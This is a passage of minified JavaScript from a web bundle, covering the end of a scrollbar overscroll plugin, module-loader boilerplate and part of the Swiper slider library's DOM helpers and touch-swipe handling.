i=this.options,n=this.scrollbar,r=this._amplitude,o=this._position,s=r[t],l=e*s<0,c=s+e*(1-(l?0:this._wheelScrollBack[t]?1:Math.abs(s/i.maxOverscroll)));r[t]=0===n.offset[t]?a(c,-i.maxOverscroll,0):a(c,0,i.maxOverscroll),l&&(o[t]=r[t])},j.prototype._render=function(){var t=this.options,e=this._amplitude,i=this._position;if(this._enabled&&(e.x||e.y||i.x||i.y)){var n=this._nextAmp("x"),r=this._nextAmp("y");switch(e.x=n.amplitude,i.x=n.position,e.y=r.amplitude,i.y=r.position,t.effect){case R.BOUNCE:this._bounce.render(i);break;case R.GLOW:this._glow.render(i,this.options.glowColor)}"function"==typeof t.onScroll&&t.onScroll.call(this,c({},i))}},j.prototype._nextAmp=function(t){var e=this.options,i=this._amplitude,n=this._position,r=1-e.damping,a=i[t],o=n[t],s=this._touching?a:a*r|0,l=s-o,c=o+l-(l*r|0);return!this._touching&&Math.abs(c)<Math.abs(o)&&(this._wheelScrollBack[t]=!0),this._wheelScrollBack[t]&&Math.abs(c)<=1&&(this._wheelScrollBack[t]=!1,this._lockWheel[t]=!0),{amplitude:s,position:c}},j.pluginName="overscroll",j.defaultOptions={effect:R.BOUNCE,onScroll:void 0,damping:.2,maxOverscroll:150,glowColor:"#87ceeb"},j);function j(){var t=null!==k&&k.apply(this,arguments)||this;return t._glow=new z(t.scrollbar),t._bounce=new I(t.scrollbar),t._wheelScrollBack={x:!1,y:!1},t._lockWheel={x:!1,y:!1},t._touching=!1,t._amplitude={x:0,y:0},t._position={x:0,y:0},t._releaseWheel=s((function(){t._lockWheel.x=!1,t._lockWheel.y=!1}),30),t}function U(){this.constructor=B}e.default=G}],e.c=n,e.d=function(t,i,n){e.o(t,i)||Object.defineProperty(t,i,{enumerable:!0,get:n})},e.r=function(t){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(t,"__esModule",{value:!0})},e.t=function(t,i){if(1&i&&(t=e(t)),8&i)return t;if(4&i&&"object"==typeof t&&t&&t.__esModule)return t;var n=Object.create(null);if(e.r(n),Object.defineProperty(n,"default",{enumerable:!0,value:t}),2&i&&"string"!=typeof t)for(var r in t)e.d(n,r,function(e){return t[e]}.bind(null,r));return n},e.n=function(t){var i=t&&t.__esModule?function(){return t.default}:function(){return t};return e.d(i,"a",i),i},e.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},e.p="",e(e.s=2).default;function e(t){if(n[t])return n[t].exports;var r=n[t]={i:t,l:!1,exports:{}};return i[t].call(r.exports,r,r.exports,e),r.l=!0,r.exports}var i,n})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t=t||self).Swiper=e()}(this,(function(){"use strict";function t(t,e){for(var i=0;i<e.length;i++){var n=e[i];n.enumerable=n.enumerable||!1,n.configurable=!0,"value"in n&&(n.writable=!0),Object.defineProperty(t,n.key,n)}}function e(){return(e=Object.assign||function(t){for(var e=1;e<arguments.length;e++){var i=arguments[e];for(var n in i)Object.prototype.hasOwnProperty.call(i,n)&&(t[n]=i[n])}return t}).apply(this,arguments)}function i(t){return null!==t&&"object"==typeof t&&"constructor"in t&&t.constructor===Object}function n(t,e){void 0===t&&(t={}),void 0===e&&(e={}),Object.keys(e).forEach((function(r){void 0===t[r]?t[r]=e[r]:i(e[r])&&i(t[r])&&Object.keys(e[r]).length>0&&n(t[r],e[r])}))}var r={body:{},addEventListener:function(){},removeEventListener:function(){},activeElement:{blur:function(){},nodeName:""},querySelector:function(){return null},querySelectorAll:function(){return[]},getElementById:function(){return null},createEvent:function(){return{initEvent:function(){}}},createElement:function(){return{children:[],childNodes:[],style:{},setAttribute:function(){},getElementsByTagName:function(){return[]}}},createElementNS:function(){return{}},importNode:function(){return null},location:{hash:"",host:"",hostname:"",href:"",origin:"",pathname:"",protocol:"",search:""}};function a(){var t="undefined"!=typeof document?document:{};return n(t,r),t}var o={document:r,navigator:{userAgent:""},location:{hash:"",host:"",hostname:"",href:"",origin:"",pathname:"",protocol:"",search:""},history:{replaceState:function(){},pushState:function(){},go:function(){},back:function(){}},CustomEvent:function(){return this},addEventListener:function(){},removeEventListener:function(){},getComputedStyle:function(){return{getPropertyValue:function(){return""}}},Image:function(){},Date:function(){},screen:{},setTimeout:function(){},clearTimeout:function(){},matchMedia:function(){return{}},requestAnimationFrame:function(t){return"undefined"==typeof setTimeout?(t(),null):setTimeout(t,0)},cancelAnimationFrame:function(t){"undefined"!=typeof setTimeout&&clearTimeout(t)}};function s(){var t="undefined"!=typeof window?window:{};return n(t,o),t}function l(t){return(l=Object.setPrototypeOf?Object.getPrototypeOf:function(t){return t.__proto__||Object.getPrototypeOf(t)})(t)}function c(t,e){return(c=Object.setPrototypeOf||function(t,e){return t.__proto__=e,t})(t,e)}function h(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Date.prototype.toString.call(Reflect.construct(Date,[],(function(){}))),!0}catch(t){return!1}}function u(t,e,i){return(u=h()?Reflect.construct:function(t,e,i){var n=[null];n.push.apply(n,e);var r=new(Function.bind.apply(t,n));return i&&c(r,i.prototype),r}).apply(null,arguments)}function d(t){var e="function"==typeof Map?new Map:void 0;return(d=function(t){if(null===t||(i=t,-1===Function.toString.call(i).indexOf("[native code]")))return t;var i;if("function"!=typeof t)throw new TypeError("Super expression must either be null or a function");if(void 0!==e){if(e.has(t))return e.get(t);e.set(t,n)}function n(){return u(t,arguments,l(this).constructor)}return n.prototype=Object.create(t.prototype,{constructor:{value:n,enumerable:!1,writable:!0,configurable:!0}}),c(n,t)})(t)}var p=function(t){var e,i;function n(e){var i,n,r;return n=function(t){if(void 0===t)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return t}(i=t.call.apply(t,[this].concat(e))||this),r=n.__proto__,Object.defineProperty(n,"__proto__",{get:function(){return r},set:function(t){r.__proto__=t}}),i}return i=t,(e=n).prototype=Object.create(i.prototype),e.prototype.constructor=e,e.__proto__=i,n}(d(Array));function f(t){void 0===t&&(t=[]);var e=[];return t.forEach((function(t){Array.isArray(t)?e.push.apply(e,f(t)):e.push(t)})),e}function m(t,e){return Array.prototype.filter.call(t,e)}function g(t,e){var i=s(),n=a(),r=[];if(!e&&t instanceof p)return t;if(!t)return new p(r);if("string"==typeof t){var o=t.trim();if(o.indexOf("<")>=0&&o.indexOf(">")>=0){var l="div";0===o.indexOf("<li")&&(l="ul"),0===o.indexOf("<tr")&&(l="tbody"),0!==o.indexOf("<td")&&0!==o.indexOf("<th")||(l="tr"),0===o.indexOf("<tbody")&&(l="table"),0===o.indexOf("<option")&&(l="select");var c=n.createElement(l);c.innerHTML=o;for(var h=0;h<c.childNodes.length;h+=1)r.push(c.childNodes[h])}else r=function(t,e){if("string"!=typeof t)return[t];for(var i=[],n=e.querySelectorAll(t),r=0;r<n.length;r+=1)i.push(n[r]);return i}(t.trim(),e||n)}else if(t.nodeType||t===i||t===n)r.push(t);else if(Array.isArray(t)){if(t instanceof p)return t;r=t}return new p(function(t){for(var e=[],i=0;i<t.length;i+=1)-1===e.indexOf(t[i])&&e.push(t[i]);return e}(r))}g.fn=p.prototype;var v,y,x,b={addClass:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];var n=f(e.map((function(t){return t.split(" ")})));return this.forEach((function(t){var e;(e=t.classList).add.apply(e,n)})),this},removeClass:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];var n=f(e.map((function(t){return t.split(" ")})));return this.forEach((function(t){var e;(e=t.classList).remove.apply(e,n)})),this},hasClass:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];var n=f(e.map((function(t){return t.split(" ")})));return m(this,(function(t){return n.filter((function(e){return t.classList.contains(e)})).length>0})).length>0},toggleClass:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];var n=f(e.map((function(t){return t.split(" ")})));this.forEach((function(t){n.forEach((function(e){t.classList.toggle(e)}))}))},attr:function(t,e){if(1===arguments.length&&"string"==typeof t)return this[0]?this[0].getAttribute(t):void 0;for(var i=0;i<this.length;i+=1)if(2===arguments.length)this[i].setAttribute(t,e);else for(var n in t)this[i][n]=t[n],this[i].setAttribute(n,t[n]);return this},removeAttr:function(t){for(var e=0;e<this.length;e+=1)this[e].removeAttribute(t);return this},transform:function(t){for(var e=0;e<this.length;e+=1)this[e].style.transform=t;return this},transition:function(t){for(var e=0;e<this.length;e+=1)this[e].style.transition="string"!=typeof t?t+"ms":t;return this},on:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];var n=e[0],r=e[1],a=e[2],o=e[3];function s(t){var e=t.target;if(e){var i=t.target.dom7EventData||[];if(i.indexOf(t)<0&&i.unshift(t),g(e).is(r))a.apply(e,i);else for(var n=g(e).parents(),o=0;o<n.length;o+=1)g(n[o]).is(r)&&a.apply(n[o],i)}}function l(t){var e=t&&t.target&&t.target.dom7EventData||[];e.indexOf(t)<0&&e.unshift(t),a.apply(this,e)}"function"==typeof e[1]&&(n=e[0],a=e[1],o=e[2],r=void 0),o||(o=!1);for(var c,h=n.split(" "),u=0;u<this.length;u+=1){var d=this[u];if(r)for(c=0;c<h.length;c+=1){var p=h[c];d.dom7LiveListeners||(d.dom7LiveListeners={}),d.dom7LiveListeners[p]||(d.dom7LiveListeners[p]=[]),d.dom7LiveListeners[p].push({listener:a,proxyListener:s}),d.addEventListener(p,s,o)}else for(c=0;c<h.length;c+=1){var f=h[c];d.dom7Listeners||(d.dom7Listeners={}),d.dom7Listeners[f]||(d.dom7Listeners[f]=[]),d.dom7Listeners[f].push({listener:a,proxyListener:l}),d.addEventListener(f,l,o)}}return this},off:function(){for(var t=arguments.length,e=new Array(t),i=0;i<t;i++)e[i]=arguments[i];var n=e[0],r=e[1],a=e[2],o=e[3];"function"==typeof e[1]&&(n=e[0],a=e[1],o=e[2],r=void 0),o||(o=!1);for(var s=n.split(" "),l=0;l<s.length;l+=1)for(var c=s[l],h=0;h<this.length;h+=1){var u=this[h],d=void 0;if(!r&&u.dom7Listeners?d=u.dom7Listeners[c]:r&&u.dom7LiveListeners&&(d=u.dom7LiveListeners[c]),d&&d.length)for(var p=d.length-1;p>=0;p-=1){var f=d[p];a&&f.listener===a||a&&f.listener&&f.listener.dom7proxy&&f.listener.dom7proxy===a?(u.removeEventListener(c,f.proxyListener,o),d.splice(p,1)):a||(u.removeEventListener(c,f.proxyListener,o),d.splice(p,1))}}return this},trigger:function(){for(var t=s(),e=arguments.length,i=new Array(e),n=0;n<e;n++)i[n]=arguments[n];for(var r=i[0].split(" "),a=i[1],o=0;o<r.length;o+=1)for(var l=r[o],c=0;c<this.length;c+=1){var h=this[c];if(t.CustomEvent){var u=new t.CustomEvent(l,{detail:a,bubbles:!0,cancelable:!0});h.dom7EventData=i.filter((function(t,e){return e>0})),h.dispatchEvent(u),h.dom7EventData=[],delete h.dom7EventData}}return this},transitionEnd:function(t){var e=this;return t&&e.on("transitionend",(function i(n){n.target===this&&(t.call(this,n),e.off("transitionend",i))})),this},outerWidth:function(t){if(this.length>0){if(t){var e=this.styles();return this[0].offsetWidth+parseFloat(e.getPropertyValue("margin-right"))+parseFloat(e.getPropertyValue("margin-left"))}return this[0].offsetWidth}return null},outerHeight:function(t){if(this.length>0){if(t){var e=this.styles();return this[0].offsetHeight+parseFloat(e.getPropertyValue("margin-top"))+parseFloat(e.getPropertyValue("margin-bottom"))}return this[0].offsetHeight}return null},styles:function(){var t=s();return this[0]?t.getComputedStyle(this[0],null):{}},offset:function(){if(this.length>0){var t=s(),e=a(),i=this[0],n=i.getBoundingClientRect(),r=e.body,o=i.clientTop||r.clientTop||0,l=i.clientLeft||r.clientLeft||0,c=i===t?t.scrollY:i.scrollTop,h=i===t?t.scrollX:i.scrollLeft;return{top:n.top+c-o,left:n.left+h-l}}return null},css:function(t,e){var i,n=s();if(1===arguments.length){if("string"!=typeof t){for(i=0;i<this.length;i+=1)for(var r in t)this[i].style[r]=t[r];return this}if(this[0])return n.getComputedStyle(this[0],null).getPropertyValue(t)}if(2===arguments.length&&"string"==typeof t){for(i=0;i<this.length;i+=1)this[i].style[t]=e;return this}return this},each:function(t){return t?(this.forEach((function(e,i){t.apply(e,[e,i])})),this):this},html:function(t){if(void 0===t)return this[0]?this[0].innerHTML:null;for(var e=0;e<this.length;e+=1)this[e].innerHTML=t;return this},text:function(t){if(void 0===t)return this[0]?this[0].textContent.trim():null;for(var e=0;e<this.length;e+=1)this[e].textContent=t;return this},is:function(t){var e,i,n=s(),r=a(),o=this[0];if(!o||void 0===t)return!1;if("string"==typeof t){if(o.matches)return o.matches(t);if(o.webkitMatchesSelector)return o.webkitMatchesSelector(t);if(o.msMatchesSelector)return o.msMatchesSelector(t);for(e=g(t),i=0;i<e.length;i+=1)if(e[i]===o)return!0;return!1}if(t===r)return o===r;if(t===n)return o===n;if(t.nodeType||t instanceof p){for(e=t.nodeType?[t]:t,i=0;i<e.length;i+=1)if(e[i]===o)return!0;return!1}return!1},index:function(){var t,e=this[0];if(e){for(t=0;null!==(e=e.previousSibling);)1===e.nodeType&&(t+=1);return t}},eq:function(t){if(void 0===t)return this;var e=this.length;if(t>e-1)return g([]);if(t<0){var i=e+t;return g(i<0?[]:[this[i]])}return g([this[t]])},append:function(){for(var t,e=a(),i=0;i<arguments.length;i+=1){t=i<0||arguments.length<=i?void 0:arguments[i];for(var n=0;n<this.length;n+=1)if("string"==typeof t){var r=e.createElement("div");for(r.innerHTML=t;r.firstChild;)this[n].appendChild(r.firstChild)}else if(t instanceof p)for(var o=0;o<t.length;o+=1)this[n].appendChild(t[o]);else this[n].appendChild(t)}return this},prepend:function(t){var e,i,n=a();for(e=0;e<this.length;e+=1)if("string"==typeof t){var r=n.createElement("div");for(r.innerHTML=t,i=r.childNodes.length-1;i>=0;i-=1)this[e].insertBefore(r.childNodes[i],this[e].childNodes[0])}else if(t instanceof p)for(i=0;i<t.length;i+=1)this[e].insertBefore(t[i],this[e].childNodes[0]);else this[e].insertBefore(t,this[e].childNodes[0]);return this},next:function(t){return this.length>0?t?this[0].nextElementSibling&&g(this[0].nextElementSibling).is(t)?g([this[0].nextElementSibling]):g([]):this[0].nextElementSibling?g([this[0].nextElementSibling]):g([]):g([])},nextAll:function(t){var e=[],i=this[0];if(!i)return g([]);for(;i.nextElementSibling;){var n=i.nextElementSibling;t?g(n).is(t)&&e.push(n):e.push(n),i=n}return g(e)},prev:function(t){if(this.length>0){var e=this[0];return t?e.previousElementSibling&&g(e.previousElementSibling).is(t)?g([e.previousElementSibling]):g([]):e.previousElementSibling?g([e.previousElementSibling]):g([])}return g([])},prevAll:function(t){var e=[],i=this[0];if(!i)return g([]);for(;i.previousElementSibling;){var n=i.previousElementSibling;t?g(n).is(t)&&e.push(n):e.push(n),i=n}return g(e)},parent:function(t){for(var e=[],i=0;i<this.length;i+=1)null!==this[i].parentNode&&(t?g(this[i].parentNode).is(t)&&e.push(this[i].parentNode):e.push(this[i].parentNode));return g(e)},parents:function(t){for(var e=[],i=0;i<this.length;i+=1)for(var n=this[i].parentNode;n;)t?g(n).is(t)&&e.push(n):e.push(n),n=n.parentNode;return g(e)},closest:function(t){var e=this;return void 0===t?g([]):(e.is(t)||(e=e.parents(t).eq(0)),e)},find:function(t){for(var e=[],i=0;i<this.length;i+=1)for(var n=this[i].querySelectorAll(t),r=0;r<n.length;r+=1)e.push(n[r]);return g(e)},children:function(t){for(var e=[],i=0;i<this.length;i+=1)for(var n=this[i].children,r=0;r<n.length;r+=1)t&&!g(n[r]).is(t)||e.push(n[r]);return g(e)},filter:function(t){return g(m(this,t))},remove:function(){for(var t=0;t<this.length;t+=1)this[t].parentNode&&this[t].parentNode.removeChild(this[t]);return this}};function w(t,e){return void 0===e&&(e=0),setTimeout(t,e)}function _(){return Date.now()}function M(t,e){void 0===e&&(e="x");var i,n,r,a=s(),o=a.getComputedStyle(t,null);return a.WebKitCSSMatrix?((n=o.transform||o.webkitTransform).split(",").length>6&&(n=n.split(", ").map((function(t){return t.replace(",",".")})).join(", ")),r=new a.WebKitCSSMatrix("none"===n?"":n)):i=(r=o.MozTransform||o.OTransform||o.MsTransform||o.msTransform||o.transform||o.getPropertyValue("transform").replace("translate(","matrix(1, 0, 0, 1,")).toString().split(","),"x"===e&&(n=a.WebKitCSSMatrix?r.m41:16===i.length?parseFloat(i[12]):parseFloat(i[4])),"y"===e&&(n=a.WebKitCSSMatrix?r.m42:16===i.length?parseFloat(i[13]):parseFloat(i[5])),n||0}function S(t){return"object"==typeof t&&null!==t&&t.constructor&&t.constructor===Object}function T(){for(var t=Object(arguments.length<=0?void 0:arguments[0]),e=1;e<arguments.length;e+=1){var i=e<0||arguments.length<=e?void 0:arguments[e];if(null!=i)for(var n=Object.keys(Object(i)),r=0,a=n.length;r<a;r+=1){var o=n[r],s=Object.getOwnPropertyDescriptor(i,o);void 0!==s&&s.enumerable&&(S(t[o])&&S(i[o])?T(t[o],i[o]):!S(t[o])&&S(i[o])?(t[o]={},T(t[o],i[o])):t[o]=i[o])}}return t}function E(t,e){Object.keys(e).forEach((function(i){S(e[i])&&Object.keys(e[i]).forEach((function(n){"function"==typeof e[i][n]&&(e[i][n]=e[i][n].bind(t))})),t[i]=e[i]}))}function C(){return v||(v=function(){var t=s(),e=a();return{touch:!!("ontouchstart"in t||t.DocumentTouch&&e instanceof t.DocumentTouch),pointerEvents:!!t.PointerEvent&&"maxTouchPoints"in t.navigator&&t.navigator.maxTouchPoints>=0,observer:"MutationObserver"in t||"WebkitMutationObserver"in t,passiveListener:function(){var e=!1;try{var i=Object.defineProperty({},"passive",{get:function(){e=!0}});t.addEventListener("testPassiveListener",null,i)}catch(t){}return e}(),gestures:"ongesturestart"in t}}()),v}function A(t){return void 0===t&&(t={}),y||(y=function(t){var e=(void 0===t?{}:t).userAgent,i=C(),n=s(),r=n.navigator.platform,a=e||n.navigator.userAgent,o={ios:!1,android:!1},l=n.screen.width,c=n.screen.height,h=a.match(/(Android);?[\s\/]+([\d.]+)?/),u=a.match(/(iPad).*OS\s([\d_]+)/),d=a.match(/(iPod)(.*OS\s([\d_]+))?/),p=!u&&a.match(/(iPhone\sOS|iOS)\s([\d_]+)/),f="Win32"===r,m="MacIntel"===r;return!u&&m&&i.touch&&["1024x1366","1366x1024","834x1194","1194x834","834x1112","1112x834","768x1024","1024x768","820x1180","1180x820","810x1080","1080x810"].indexOf(l+"x"+c)>=0&&((u=a.match(/(Version)\/([\d.]+)/))||(u=[0,1,"13_0_0"]),m=!1),h&&!f&&(o.os="android",o.android=!0),(u||p||d)&&(o.os="ios",o.ios=!0),o}(t)),y}function L(){return x||(x=function(){var t,e=s();return{isEdge:!!e.navigator.userAgent.match(/Edge/g),isSafari:(t=e.navigator.userAgent.toLowerCase(),t.indexOf("safari")>=0&&t.indexOf("chrome")<0&&t.indexOf("android")<0),isWebView:/(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(e.navigator.userAgent)}}()),x}Object.keys(b).forEach((function(t){g.fn[t]=b[t]}));var P={name:"resize",create:function(){var t=this;T(t,{resize:{resizeHandler:function(){t&&!t.destroyed&&t.initialized&&(t.emit("beforeResize"),t.emit("resize"))},orientationChangeHandler:function(){t&&!t.destroyed&&t.initialized&&t.emit("orientationchange")}}})},on:{init:function(t){var e=s();e.addEventListener("resize",t.resize.resizeHandler),e.addEventListener("orientationchange",t.resize.orientationChangeHandler)},destroy:function(t){var e=s();e.removeEventListener("resize",t.resize.resizeHandler),e.removeEventListener("orientationchange",t.resize.orientationChangeHandler)}}},R={attach:function(t,e){void 0===e&&(e={});var i=s(),n=this,r=new(i.MutationObserver||i.WebkitMutationObserver)((function(t){if(1!==t.length){var e=function(){n.emit("observerUpdate",t[0])};i.requestAnimationFrame?i.requestAnimationFrame(e):i.setTimeout(e,0)}else n.emit("observerUpdate",t[0])}));r.observe(t,{attributes:void 0===e.attributes||e.attributes,childList:void 0===e.childList||e.childList,characterData:void 0===e.characterData||e.characterData}),n.observer.observers.push(r)},init:function(){if(this.support.observer&&this.params.observer){if(this.params.observeParents)for(var t=this.$el.parents(),e=0;e<t.length;e+=1)this.observer.attach(t[e]);this.observer.attach(this.$el[0],{childList:this.params.observeSlideChildren}),this.observer.attach(this.$wrapperEl[0],{attributes:!1})}},destroy:function(){this.observer.observers.forEach((function(t){t.disconnect()})),this.observer.observers=[]}},O={name:"observer",params:{observer:!1,observeParents:!1,observeSlideChildren:!1},create:function(){E(this,{observer:e(e({},R),{},{observers:[]})})},on:{init:function(t){t.observer.init()},destroy:function(t){t.observer.destroy()}}};function I(t){var e=a(),i=s(),n=this.touchEventsData,r=this.params,o=this.touches;if(!this.animating||!r.preventInteractionOnTransition){var l=t;l.originalEvent&&(l=l.originalEvent);var c=g(l.target);if(("wrapper"!==r.touchEventsTarget||c.closest(this.wrapperEl).length)&&(n.isTouchEvent="touchstart"===l.type,(n.isTouchEvent||!("which"in l)||3!==l.which)&&!(!n.isTouchEvent&&"button"in l&&l.button>0||n.isTouched&&n.isMoved)))if(!!r.noSwipingClass&&""!==r.noSwipingClass&&l.target&&l.target.shadowRoot&&t.path&&t.path[0]&&(c=g(t.path[0])),r.noSwiping&&c.closest(r.noSwipingSelector?r.noSwipingSelector:"."+r.noSwipingClass)[0])this.allowClick=!0;else if(!r.swipeHandler||c.closest(r.swipeHandler)[0]){o.currentX="touchstart"===l.type?l.targetTouches[0].pageX:l.pageX,o.currentY="touchstart"===l.type?l.targetTouches[0].pageY:l.pageY;var h=o.currentX,u=o.currentY,d=r.edgeSwipeDetection||r.iOSEdgeSwipeDetection,p=r.edgeSwipeThreshold||r.iOSEdgeSwipeThreshold;if(!d||!(h<=p||h>=i.screen.width-p)){if(T(n,{isTouched:!0,isMoved:!1,allowTouchCallbacks:!0,isScrolling:void 0,startMoving:void 0}),o.startX=h,o.startY=u,n.touchStartTime=_(),this.allowClick=!0,this.updateSize(),this.swipeDirection=void 0,r.threshold>0&&(n.allowThresholdMove=!1),"touchstart"!==l.type){var f=!0;c.is(n.formElements)&&(f=!1),e.activeElement&&g(e.activeElement).is(n.formElements)&&e.activeElement!==c[0]&&e.activeElement.blur();var m=f&&this.allowTouchMove&&r.touchStartPreventDefault;(r.touchStartForcePreventDefault||m)&&l.preventDefault()}this.emit("touchStart",l)}}}}function z(t){var e=a(),i=this.touchEventsData,n=this.params,r=this.touches,o=this.rtlTranslate,s=t;if(s.originalEvent&&(s=s.originalEvent),i.isTouched){if(!i.isTouchEvent||"touchmove"===s.type){var l="touchmove"===s.type&&s.targetTouches&&(s.targetTouches[0]||s.changedTouches[0]),c="touchmove"===s.type?l.pageX:s.pageX,h="touchmove"===s.type?l.pageY:s.pageY;if(s.preventedByNestedSwiper)return r.startX=c,void(r.startY=h);if(!this.allowTouchMove)return this.allowClick=!1,void(i.isTouched&&(T(r,{startX:c,startY:h,currentX:c,currentY:h}),i.touchStartTime=_()));if(i.isTouchEvent&&n.touchReleaseOnEdges&&!n.loop)if(this.isVertical()){if(h<r.startY&&this.translate<=this.maxTranslate()||h>r.startY&&this.translate>=this.minTranslate())return i.isTouched=!1,void(i.isMoved=!1)}else if(c<r.startX&&this.translate<=this.maxTranslate()||c>r.startX&&this.translate>=this.minTranslate())return;if(i.isTouchEvent&&e.activeElement&&s.target===e.activeElement&&g(s.target).is(i.formElements))return i.isMoved=!0,void(this.allowClick=!1);if(i.allowTouchCallbacks&&this.emit("touchMove",s),!(s.targetTouches&&s.targetTouches.length>1)){r.currentX=c,r.currentY=h;var u,d=r.currentX-r.startX,p=r.currentY-r.startY;if(!(this.params.threshold&&Math.sqrt(Math.pow(d,2)+Math.pow(p,2))<this.params.threshold))if(void 0===i.isScrolling&&(this.isHorizontal()&&r.currentY===r.startY||this.isVertical()&&r.currentX===r.startX?i.isScrolling=!1:d*d+p*p>=25&&(u=180*Math.atan2(Math.abs(p),Math.abs(d))/Math.PI,i.isScrolling=this.isHorizontal()?u>n.touchAngle:90-u>n.touchAngle)),i.isScrolling&&this.emit("touchMoveOpposite",s),void 0===i.startMoving&&(r.currentX===r.startX&&r.currentY===r.startY||(i.startMoving=!0)),i.isScrolling)i.isTouched=!1;else if(i.startMoving){this.allowClick=!1,!n.cssMode&&s.cancelable&&s.preventDefault(),n.touchMoveStopPropagation&&!n.nested&&s.stopPropagation(),i.isMoved||(n.loop&&this.loopFix(),i.startTranslate=this.getTranslate(),this.setTransition(0),this.animating&&this.$wrapperEl.trigger("webkitTransitionEnd transitionend"),i.allowMomentumBounce=!1,!n.grabCursor||!0!==this.allowSlideNext&&!0!==this.allowSlidePrev||this.setGrabCursor(!0),this.emit("sliderFirstMove",s)),this.emit("sliderMove",s),i.isMoved=!0;var f=this.isHorizontal()?d:p;r.diff=f,f*=n.touchRatio,o&&(f=-f),this.swipeDirection=f>0?"prev":"next",i.currentTranslate=f+i.startTranslate;var m=!0,v=n.resistanceRatio;if(n.touchReleaseOnEdges&&(v=0),f>0&&i.currentTranslate>this.minTranslate()?(m=!1,n.resistance&&(i.currentTranslate=this.minTranslate()-1+Math.pow(-this.minTranslate()+i.startTranslate+f,v))):f<0&&i.currentTranslate<this.maxTranslate()&&(m=!1,n.resistance&&(i.currentTranslate=this.maxTranslate()+1-Math.pow(this.maxTranslate()-i.startTranslate-f,v))),m&&(s.preventedByNestedSwiper=!0),!this.allowSlideNext&&"next"===this.swipeDirection&&i.currentTranslate<i.startTranslate&&(i.currentTranslate=i.startTranslate),!this.allowSlidePrev&&"prev"===this.swipeDirection&&i.currentTranslate>i.startTranslate&&(i.currentTranslate=i.startTranslate),n.threshold>0){if(!(Math.abs(f)>n.threshold||i.allowThresholdMove))return void(i.currentTranslate=i.startTranslate);if(!i.allowThresholdMove)return i.allowThresholdMove=!0,r.startX=r.currentX,r.startY=r.currentY,i.currentTranslate=i.startTranslate,void(r.diff=this.isHorizontal()?r.currentX-r.startX:r.currentY-r.startY)}n.followFinger&&!n.cssMode&&((n.freeMode||n.watchSlidesProgress||n.watchSlidesVisibility)&&(this.updateActiveIndex(),this.updateSlidesClasses()),n.freeMode&&(0===i.velocities.length&&i.velocities.push({position:r[this.isHorizontal()?"startX":"startY"],time:i.touchStartTime}),i.velocities.push({position:r[this.isHorizontal()?"currentX":"currentY"],time:_()})),this.updateProgress(i.currentTranslate),this.setTranslate(i.currentTranslate))}}}}else i.startMoving&&i.isScrolling&&this.emit("touchMoveOpposite",s)}function D(t){var e=this,i=e.touchEventsData,n=e.params,r=e.touches,a=e.rtlTranslate,o=e.$wrapperEl,s=e.slidesGrid,l=e.snapGrid,c=t;if(c.originalEvent&&(c=c.originalEvent),i.allowTouchCallbacks&&e.emit("touchEnd",c),i.allowTouchCallbacks=!1,!i.isTouched)return i.isMoved&&n.grabCursor&&e.setGrabCursor(!1),i.isMoved=!1,void(i.startMoving=!1);n.grabCursor&&i.isMoved&&i.isTouched&&(!0===e.allowSlideNext||!0===e.allowSlidePrev)&&e.setGrabCursor(!1);var h,u=_(),d=u-i.touchStartTime;if(e.allowClick&&(e.updateClickedSlide(c),e.emit("tap click",c),d<300&&u-i.lastClickTime<300&&e.emit("doubleTap doubleClick",c)),i.lastClickTime=_(),w((function(){e.destroyed||(e.allowClick=!0)})),!i.isTouched||!i.isMoved||!e.swipeDirection||0===r.diff||i.currentTranslate===i.startTranslate)return i.isTouched=!1,i.isMoved=!1,void(i.startMoving=!1);if(i.isTouched=!1,i.isMoved=!1,i.startMoving=!1,h=n.followFinger?a?e.translate:-e.translate:-i.currentTranslate,!n.cssMode)if(n.freeMode){if(h<-e.minTranslate())return void e.slideTo(e.activeIndex);if(h>-e.maxTranslate())return void(e.slides.length<l.length?e.slideTo(l.length-1):e.slideTo(e.slides.length-1));if(n.freeModeMomentum){if(i.velocities.length>1){var p=i.velocities.pop(),f=i.velocities.pop(),m=p.position-f.position,g=p.time-f.time;e.velocity=m/g,e.velocity/=2,Math.abs(e.velocity)<n.freeModeMinimumVelocity&&(e.velocity=0),(g>150||_()-p.time>300)&&(e.velocity=0)}else e.velocity=0;e.velocity*=n.freeModeMomentumVelocityRatio,i.velocities.length=0;var v=1e3*n.freeModeMomentumRatio,y=e.velocity*v,x=e.translate+y;a&&(x=-x);var b,M,S=!1,T=20*Math.abs(e.velocity)*n.freeModeMomentumBounceRatio;if(x<e.maxTranslate())n.freeModeMomentumBounce?(x+e.maxTranslate()<-T&&(x=e.maxTranslate()-T),b=e.maxTranslate(),S=!0,i.allowMomentumBounce=!0):x=e.maxTranslate(),n.loop&&n.centeredSlides&&(M=!0);else if(x>e.minTranslate())n.freeModeMomentumBounce?(x-e.minTranslate()>T&&(x=e.minTranslate()+T),b=e.minTranslate(),S=!0,i.allowMomentumBounce=!0):x=e.minTranslate(),n.loop&&n.centeredSlides&&(M=!0);else if(n.freeModeSticky){for(var E,C=0;C<l.length;C+=1)if(l[C]>-x){E=C;break}x=-(x=Math.abs(l[E]-x)<Math.abs(l[E-1]-x)||"next"===e.swipeDirection?l[E]:l[E-1])}if(M&&e.once("transitionEnd",(function(){e.loopFix()})),0!==e.velocity){if(v=a?Math.abs((-x-e.translate)/e.velocity):Math.abs((x-e.translate)/e.velocity),n.freeModeSticky){var A=Math.abs((a?-x:x)-e.translate),L=e.slidesSizesGrid[e.activeIndex];v=A<L?n.speed:A<2*L?1.5*n.speed:2.5*n.speed}}else if(n.freeModeSticky)return void 